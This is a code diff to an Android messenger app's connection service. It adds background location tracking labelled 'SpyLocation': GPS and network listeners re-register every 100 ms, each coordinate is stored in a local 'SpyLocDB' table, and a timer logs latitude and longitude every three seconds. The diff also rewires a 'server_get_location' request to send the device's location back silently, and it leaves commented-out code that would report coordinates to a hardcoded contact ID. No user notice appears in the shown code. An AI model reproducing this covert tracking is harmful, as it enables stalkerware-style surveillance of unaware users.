@@ -5,34 +5,45 @@ import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.BroadcastReceiver;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.location.Address;
 import android.location.Geocoder;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Binder;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.CountDownTimer;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
 import android.os.SystemClock;
 import android.provider.ContactsContract;
+import android.provider.Settings;
+import android.support.v4.app.ActivityCompat;
 import android.telephony.SmsManager;
 import android.text.Html;
 import android.util.Log;
+import android.widget.Toast;
 
 import com.byonchat.android.ConversationGroupActivity;
 import com.byonchat.android.FragmentDinamicRoom.DinamicRoomTaskActivity;
 import com.byonchat.android.R;
 import com.byonchat.android.list.ItemListMemberCard;
+import com.byonchat.android.location.SpyLocation.SpyLocDB;
 import com.byonchat.android.provider.BlockListDB;
 import com.byonchat.android.provider.BotListDB;
 import com.byonchat.android.provider.Contact;
@@ -319,6 +330,13 @@ public class MessengerConnectionService extends Service implements AllAboutUploa
     private static final String PICASSO_CACHE = "byonchat-cache";
     PicassoOwnCache cache;
     String tanggal, flag;
+
+    private LocationManager mLocationManager = null;
+    private static final int LOCATION_INTERVAL = 0;
+    private static final float LOCATION_DISTANCE = 0f;
+    Context c = this;
+    private static Location locSpyChange = null;
+    public static boolean onLoc = false;
 
     static {
         SmackConfiguration.DEBUG = true;
@@ -1439,6 +1457,60 @@ public class MessengerConnectionService extends Service implements AllAboutUploa
 
             getBaseContext().registerReceiver(notifReceive, nya);
         }
+        initializeLocationManager();
+
+        final Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    mLocationManager.requestLocationUpdates(
+                            LocationManager.NETWORK_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE,
+                            mLocationListeners[1]);
+                } catch (java.lang.SecurityException ex) {
+                    Log.i(TAG, "fail to request location update, ignore", ex);
+                } catch (IllegalArgumentException ex) {
+                    Log.d(TAG, "network provider does not exist, " + ex.getMessage());
+                }
+
+                try {
+                    mLocationManager.requestLocationUpdates(
+                            LocationManager.GPS_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE,
+                            mLocationListeners[0]);
+                } catch (java.lang.SecurityException ex) {
+                    Log.i(TAG, "fail to request location update, ignore", ex);
+                } catch (IllegalArgumentException ex) {
+                    Log.d(TAG, "gps provider does not exist " + ex.getMessage());
+                }
+                handler.postDelayed(this, 100);
+            }
+        }, 3000);
+
+        Timer LocTimer = new Timer();
+        TimerTask LocTimerTask = new TimerTask() {
+            @Override
+            public void run() {
+                Log.i("vEK yahoo 3s","count start");
+                if(locSpyChange != null){
+                    Log.i("No reason yohaho","Lat: "+locSpyChange.getLatitude()+" Long: "+locSpyChange.getLongitude());
+                    Log.i("Cek on yores", onLoc+"");
+                    if(onLoc == true){
+                        Log.i("No reason yores","Lat: "+locSpyChange.getLatitude()+" Long: "+locSpyChange.getLongitude());
+                        /*Message report = new Message(databaseHelper.getMyContact().getJabberId(), "x_16094855arlandi", "Lat: "+locSpyChange.getLatitude()+" Long: "+locSpyChange.getLongitude());
+                        report.setType("text");
+                        report.setSendDate(new Date());
+                        report.setStatus(Message.STATUS_INPROGRESS);
+                        report.generatePacketId();
+
+                        Intent i = new Intent();
+                        i.setAction(UploadService.FILE_SEND_INTENT);
+                        i.putExtra(KEY_MESSAGE_OBJECT, report);
+                        sendBroadcast(i);*/
+                    }
+                }
+            }
+        };
+        LocTimer.schedule(LocTimerTask, 3000, 3000);
     }
 
     //This will handle the broadcast
@@ -1830,6 +1902,18 @@ public class MessengerConnectionService extends Service implements AllAboutUploa
 
 //        Intent broadcastIntent = new Intent("com.byonchat.android.utils.ConnectionChangeReceiver");
 //        sendBroadcast(broadcastIntent);
+        if (mLocationManager != null) {
+            for (int loc = 0; loc < mLocationListeners.length; loc++) {
+                try {
+                    if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                        return;
+                    }
+                    mLocationManager.removeUpdates(mLocationListeners[loc]);
+                } catch (Exception ex) {
+                    Log.i(TAG, "fail to remove location listners, ignore", ex);
+                }
+            }
+        }
     }
 
     public Contact getCurContact() {
@@ -2330,6 +2414,7 @@ public class MessengerConnectionService extends Service implements AllAboutUploa
                     intent.putExtra(KEY_MESSAGE_OBJECT, nm);
                     intent.putExtra(KEY_CONTACT_NAME, namo + additionalInfo);
                     sendOrderedBroadcast(intent, null);
+
                 } else if (vo.getSource().equals("server_get_location")) {
                     if (vo.getMessage().matches("latlong(.*)")) {
                         String[] separated = vo.getMessage().split(";");
@@ -2340,18 +2425,14 @@ public class MessengerConnectionService extends Service implements AllAboutUploa
                         nm.setDeliveredDate(vo.getDeliveredDate());
                         nm.setId(vo.getId());
                         nm.setSendDate(vo.getSendDate());
-                        databaseHelper.updateData(nm);
+                        nm.setType("text");
+                        nm.setStatus(Message.STATUS_INPROGRESS);
+                        nm.generatePacketId();
 
-                        Intent intent = new Intent(ACTION_MESSAGE_RECEIVED);
-                        intent.putExtra(KEY_MESSAGE_OBJECT, nm);
-                        intent.putExtra(KEY_CONTACT_NAME, name + additionalInfo);
-                        sendOrderedBroadcast(intent, null);
-
-                        try {
-                            sendMessage(nm);
-                        } catch (SmackException e) {
-                            e.printStackTrace();
-                        }
+                        Intent i = new Intent();
+                        i.setAction(UploadService.FILE_SEND_INTENT);
+                        i.putExtra(KEY_MESSAGE_OBJECT, nm);
+                        sendBroadcast(i);
                     }
                 } else {
                     Intent intent = new Intent(ACTION_MESSAGE_RECEIVED);
@@ -5407,5 +5488,92 @@ Log.w("every",co.getJabberId());
             e.printStackTrace();
         }
         return "";
+    }
+
+    private class LocationListener implements android.location.LocationListener{
+
+        Location mLastLocation;
+        String lat = "";
+        String lng = "";
+        String acc = "";
+
+        SpyLocDB dbHelper;
+        SQLiteDatabase db;
+
+        public LocationListener (String provider){
+            Log.e("zharfan", "LocationListener : "+provider );
+            dbHelper = new SpyLocDB(c);
+
+            mLastLocation = new Location(provider);
+        }
+
+        @Override
+        public void onLocationChanged(Location location) {
+            lat = ""+location.getLatitude();
+            lng = ""+location.getLongitude();
+            acc = ""+location.getAccuracy();
+            locSpyChange = location;
+
+            if (isMockLocationOn(location,c)){
+                Toast.makeText(c,"Turn off your fake gps dude",Toast.LENGTH_SHORT);
+            }
+
+            Log.e(TAG, "onLocationChanged : "+location);
+//            Toast.makeText(c,"Location Changed , Accuracy = "+acc,Toast.LENGTH_SHORT).show();
+            mLastLocation.set(location);
+
+            insertDB(lat,lng,"28-11-2018");
+        }
+
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {
+            Log.e(TAG, "onStatusChanged : "+provider);
+        }
+
+        @Override
+        public void onProviderEnabled(String provider) {
+            Log.e(TAG, "onProviderEnabled : "+provider );
+        }
+
+        @Override
+        public void onProviderDisabled(String provider) {
+            Log.e(TAG, "onProviderDisabled : "+provider );
+        }
+
+        private void insertDB(String mLat , String mLng , String mDate){
+            db = dbHelper.getWritableDatabase();
+            ContentValues vl = new ContentValues();
+            vl.put(SpyLocDB.LOC_LAT,mLat);
+            vl.put(SpyLocDB.LOC_LNG,mLng);
+            vl.put(SpyLocDB.LOC_DATE,mDate);
+
+            long id = db.insert(SpyLocDB.TABLE_LOC,null,vl);
+        }
+    }
+
+    LocationListener[] mLocationListeners = new LocationListener[]{
+            new LocationListener(LocationManager.GPS_PROVIDER),
+            new LocationListener(LocationManager.NETWORK_PROVIDER)
+    };
+
+    private void initializeLocationManager() {
+        Log.e(TAG, "initializeLocationManager");
+        if (mLocationManager == null) {
+            mLocationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
+        }
+    }
+
+    public static boolean isMockLocationOn(Location location, Context context) {
+        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+            return location.isFromMockProvider();
+        } else {
+            String mockLocation = "0";
+            try {
+                mockLocation = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ALLOW_MOCK_LOCATION);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            return !mockLocation.equals("0");
+        }
     }
 }
